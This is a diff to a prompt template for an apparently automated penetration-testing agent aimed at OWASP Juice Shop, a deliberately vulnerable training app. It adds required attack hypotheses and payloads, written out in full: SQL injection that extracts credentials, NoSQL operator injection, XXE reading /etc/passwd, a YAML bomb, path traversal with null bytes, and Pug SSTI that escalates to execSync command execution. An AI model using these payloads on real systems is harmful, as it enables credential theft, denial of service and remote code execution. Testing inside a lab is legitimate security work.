@@ -62,10 +62,32 @@ SELECT * FROM Users WHERE email = '<EMAIL>' AND password = '<HASHED_PASSWORD>' A
 ## MANDATORY Hypotheses
 
 Your output MUST include hypotheses for ALL of the following (at minimum):
+
+### SQL Injection (Search + Login)
 1. Boolean-based SQL injection on `/rest/products/search?q=` using `')) OR 1=1--`
 2. UNION-based SQL injection on `/rest/products/search?q=` for schema extraction (9 columns)
 3. UNION-based SQL injection on `/rest/products/search?q=` for user credential extraction
 4. Authentication bypass on `/rest/user/login` via email field injection
+5. Christmas Special SQLi — `')) UNION SELECT ... WHERE deletedAt IS NOT NULL--` to find hidden/deleted products on search endpoint
+6. User Credentials extraction — UNION query extracting `id,email,password,role` from `Users` table
+
+### NoSQL Injection
+7. NoSQL operator injection on `PATCH /rest/products/reviews` using `{"id":{"$ne":-1}}` to modify all reviews
+8. NoSQL query injection on login endpoint — `{"email":{"$gt":""},"password":{"$gt":""}}` (if MongoDB layer exists)
+
+### XXE (XML External Entity)
+9. XXE file disclosure via XML upload to `POST /file-upload` with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
+10. XXE via B2B orders endpoint `POST /b2b/v2/orders` with malicious XML payload
+
+### YAML Injection
+11. YAML injection/bomb via YAML file upload to `POST /file-upload` — a YAML bomb (`&a [*a,*a,...]`) that causes DoS via exponential expansion
+
+### Path Traversal & Null Bytes
+12. Path traversal on `GET /ftp/:file` using `../` sequences to access files outside the ftp directory
+13. Poison Null Byte — `%00` in file paths on `/ftp/` to bypass extension filters (e.g., `package.json.bak%2500.md`)
+
+### Server-Side Template Injection (SSTI)
+14. SSTI on `POST /b2b/v2/orders` via Pug/Jade template injection in the `orderLinesData` field — e.g., `#{7*7}` or `#{global.process.mainModule.require('child_process').execSync('id')}`
 
 ## Hypothesis Format
 
@@ -75,7 +97,7 @@ For EACH hypothesis, use this EXACT format:
 ### Hypothesis N
 **Endpoint:** <METHOD> <full URL path>
 **Parameter:** <parameter name>
-**Injection Type:** <boolean / UNION / auth bypass / blind / error-based>
+**Injection Type:** <boolean / UNION / auth bypass / blind / error-based / NoSQL / XXE / YAML / path-traversal / null-byte / SSTI>
 **Payload:** <specific injection payload — must account for the exact query shape>
 **URL-Encoded Payload:** <the payload with special chars URL-encoded for direct use in curl>
 **Expected Result:** <what a successful injection would produce — be specific about response differences>
@@ -115,10 +137,42 @@ Produce a markdown document with the heading `## Hypotheses` followed by at leas
   - Boolean: `qwert')) OR 1=1--` (NOT `' OR 1=1--` — that fails because it doesn't close the parentheses)
   - UNION schema: `qwert')) UNION SELECT sql,name,'3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--`
   - UNION users: `qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--`
+  - Christmas Special: `qwert')) UNION SELECT id,name,description,price,'5','6','7','8','9' FROM Products WHERE deletedAt IS NOT NULL--`
 - **Login endpoint payloads** (inject via email field only):
   - Auth bypass: `' OR 1=1--` in the email field, any password
   - Targeted admin bypass: `admin@juice-sh.op'--` in the email field
 - For JSON body injection (login): `{"email": "' OR 1=1--", "password": "x"}`
 - For NoSQL-style: try `{"email": {"$gt": ""}, "password": {"$gt": ""}}` (if MongoDB layer exists)
+
+### NoSQL Injection Payloads
+- `PATCH /rest/products/reviews` with body: `{"id":{"$ne":-1},"message":"hacked"}`
+- Operators to try: `$ne`, `$gt`, `$regex`, `$where`
+
+### XXE Payloads
+- Upload XML to `/file-upload` or `/b2b/v2/orders`:
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <stockCheck><productId>&xxe;</productId></stockCheck>
+  ```
+- For B2B orders: POST XML with `Content-Type: application/xml`
+
+### YAML Injection Payloads
+- Upload a `.yml` file to `/file-upload` containing a YAML bomb:
+  ```yaml
+  a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+  ```
+
+### Path Traversal / Null Byte Payloads
+- `GET /ftp/eastere.gg%2500.md` — null byte (`%2500` = URL-encoded `%00`) bypasses extension filter
+- `GET /ftp/package.json.bak%2500.md` — access backup files via null byte bypass
+- `GET /ftp/../../etc/passwd` — direct path traversal attempt
+- `GET /ftp/coupons_2013.md.bak%2500.md` — access coupon backup files
+
+### SSTI Payloads (Pug/Jade on B2B endpoint)
+- `POST /b2b/v2/orders` with `orderLinesData` containing: `#{7*7}` (expect `49` in response)
+- Escalation: `#{global.process.mainModule.require('child_process').execSync('id').toString()}`
 
 Save the output as `hypotheses_injection.md` using the `save_deliverable` tool.
